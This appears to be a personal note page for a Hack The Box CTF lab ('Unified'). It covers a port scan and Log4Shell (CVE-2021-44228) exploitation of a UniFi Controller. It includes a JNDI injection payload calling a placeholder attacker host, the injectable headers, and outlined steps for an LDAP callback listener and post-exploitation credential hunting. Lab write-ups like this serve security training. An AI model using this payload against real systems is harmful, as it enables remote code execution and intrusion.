---
title: HTB CTF - Unified - CVE-2021-44228
draft: false
tags:
  - discovery
  - cve-2021-44228
  - log4j
  - unifi
  - enumeration
NeedsReview: false
---
> [!summary] Core Concept  
Targeted enumeration revealed a vulnerable UniFi Controller (v6.4.54) exposed over HTTPS. The version is known to be vulnerable to **Log4Shell (CVE-2021-44228)**, which allows remote code execution via crafted input in logging parameters.

---

## 🔹 In — Gaining Initial Foothold

### 🌐 Target Information
- **IP:** `10.129.129.190`
- **Service:** UniFi Controller
- **Version:** `6.4.54`
- **URL:** [https://10.129.129.190:8443](https://10.129.129.190:8443)
- **Vulnerability:** CVE-2021-44228

---

## 📡 Full Port Scan

```bash
sudo nmap -sS -v4 -T5 -p 1-65535 10.129.129.190
````

### Results:

|Port|State|Service|Notes|
|---|---|---|---|
|22/tcp|open|ssh|Potential for lateral movement|
|6789/tcp|open|ibm-db2-admin|Rare — may be misconfigured|
|8080/tcp|open|http-proxy|Likely redirect or API|
|8443/tcp|open|https-alt|UniFi Controller Web UI|
|8843/tcp|open|unknown|Possible alternate web service|
|8880/tcp|open|cddbp-alt|Custom or HTTP service|

---

## ☣️ Vulnerability: CVE-2021-44228

**Log4Shell** affects Java-based applications using vulnerable versions of the Log4j library. User-controlled input that is logged can lead to:

- **Remote Code Execution (RCE)**
- **Full system compromise**

### 🧪 Exploitation Overview (via callback payload)

```bash
${jndi:ldap://attacker.com/exploit}
```

Injectable fields:

- Headers (User-Agent, X-Forwarded-For)
- Form inputs, URLs, etc.

---

> [!warning]  
> This vulnerability is **critical** and can be exploited remotely. It was actively used in real-world attacks after its disclosure in December 2021.

> [!tip]  
> Use tools like `log4j-scan` or `nuclei` to detect active injection points automatically.

---

## 📌 Next Steps

- Identify input vectors (headers, fields) in the UniFi web interface.
- Set up listener with `ldaprefserver` or `marshalsec`.
- Capture callback and deliver malicious payload for RCE.
- Post-exploitation: look for credentials, config backups, or SSH pivoting.

---

## 🌐 Related Tools

- [[nuclei]] - CVE scanning
- [`log4j-scan`](https://github.com/fullhunt/log4j-scan)
- [[Burpsuite]] - Manual fuzzing
- [`ldap-ref-server`](https://github.com/mbechler/marshalsec) - LDAP exploitation
